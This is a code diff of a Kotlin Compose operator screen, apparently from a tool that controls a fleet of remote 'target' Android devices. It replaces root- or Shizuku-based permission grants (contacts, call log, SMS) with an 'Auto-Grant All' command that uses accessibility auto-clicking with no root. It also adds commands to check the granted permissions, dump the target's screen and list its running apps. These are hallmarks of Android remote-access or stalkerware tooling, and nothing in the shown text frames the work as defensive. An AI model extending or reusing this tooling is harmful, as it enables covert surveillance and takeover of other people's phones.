@@ -233,7 +233,7 @@ fun FleetScreen(
 
             // PERMISSIONS grid
             Text(
-                "GRANT PERMISSIONS (requires Shizuku/root on target)",
+                "PERMISSIONS (a11y auto-click — no root/Shizuku)",
                 color = TextSecondary,
                 fontFamily = FontFamily.Monospace,
                 fontSize = 11.sp,
@@ -246,9 +246,10 @@ fun FleetScreen(
                 modifier = Modifier.height(120.dp)
             ) {
                 items(listOf(
-                    ActionData("Read Contacts", Icons.Default.Contacts, AccentGreen, "grant:READ_CONTACTS"),
-                    ActionData("Read CallLog", Icons.Default.Call, AccentGreen, "grant:READ_CALL_LOG"),
-                    ActionData("Read SMS", Icons.Default.Message, AccentGreen, "grant:READ_SMS"),
+                    ActionData("Auto-Grant All", Icons.Default.Lock, AccentGreen, "autogrant"),
+                    ActionData("Check Granted", Icons.Default.CheckCircle, AccentAmber, "perms"),
+                    ActionData("Dump Screen", Icons.Default.Visibility, AccentPurple, "screen"),
+                    ActionData("Running Apps", Icons.Default.Apps, AccentAmber, "apps"),
                 )) { action ->
                     ActionButton(
                         label = action.label,
@@ -256,8 +257,8 @@ fun FleetScreen(
                         color = action.color,
                         busy = busyAction == action.label,
                         onClick = {
-                            val perm = action.command.substringAfter("grant:")
-                            runAction(action.label, "grant", """{"permission":"$perm"}""")
+                            val cmd = action.command
+                            runAction(action.label, cmd, "{}")
                         }
                     )
                 }
